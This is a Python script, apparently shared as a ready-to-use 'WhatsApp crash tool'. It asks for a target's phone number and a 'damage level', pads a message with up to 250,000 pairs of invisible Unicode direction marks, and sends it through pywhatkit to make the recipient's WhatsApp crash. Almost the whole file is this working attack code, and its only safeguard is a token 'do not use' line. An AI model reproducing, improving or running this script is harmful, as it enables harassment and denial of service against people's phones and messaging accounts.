#This program crashes a whatsapp account without crash texts 
#it works by adding the 8026 amd 8027 ascii character to you message multiple times because these characters are invisible, they can bevome much and cause a ddos

from datetime import datetime
import sys

now = datetime.now()
hour = now.hour
mintoexecute = now.minute + 1
messagetosend = "Ahhhhhh"

intensitynum = 3
page = 1
errorintensity = False

while page == 1:
	if errorintensity == True:
		print("\033[0;31;40mInput the right intensity number")
		print("")
	print("\033[0;32;40m#########################")
	print("#")
	print("#")
	print("# Scream - Whatsapp Crash Tool")
	print("#")
	print("\033[1;32;40mBy Karma-cyberwarrrior \n")
	print("\033[0;32;40m#########################")
	print("Crash Tool || \nDo not use againt devices not permitted to use ||")
	print("karma-cyberwarrior.netlify.app")
	print(" ")
	print("Enter the following details")
	target = input("Target's number e.g +234: ")
	message = input("Type a normal message: ")
	print("")
	print("\033[1;31;40mThe damage level of the crash is on a scale of 1-5.\nRecommended: 3")
	print("\033[0;32;40m")
	intensity = input("Damage level of crash: ")
	
	print("")
	print("loading")
	
	if message != "" and message != " ":
		messagetosend = message
		
	if intensity == "1":
		intensitynum = 1
		page = 2
	elif intensity == "2":
		intensitynum = 2
		page = 2
	elif intensity == "3":
		intensitynum = 3
		page = 2
	elif intensity == "4":
		intensitynum = 4
		page = 2
	elif intensity == "5":
		intensitynum = 5
		page = 2
	else:
		errorintensity = True
		page = 1
		
while page == 2:
	messageconv = [ ]
	
	
	for char in messagetosend:
		ascii = ord(char)
		seek = ascii
		messageconv.append(seek)
	
	count = 0
	intensitydamage = intensitynum * 50000
	while count <= intensitydamage:
		bug = 8206
		bugt = 8207
		messageconv.append(bug)
		messageconv.append(bugt)
		count = count + 1
		
	print(messageconv)
		
	wordbug = ""
	for num in messageconv:
		wordbug = wordbug + chr(num)
		
	final = wordbug
	print(final)
	
	
	import pywhatkit
	now = datetime.now()
	hour = now.hour
	mintoexec = now.minute + 1
	pywhatkit.sendwhatmsg(target, final, hour, mintoexec)
	page = 3
	
	
while page == 3:
	print("")
	print("Completed")
	sys.exit()
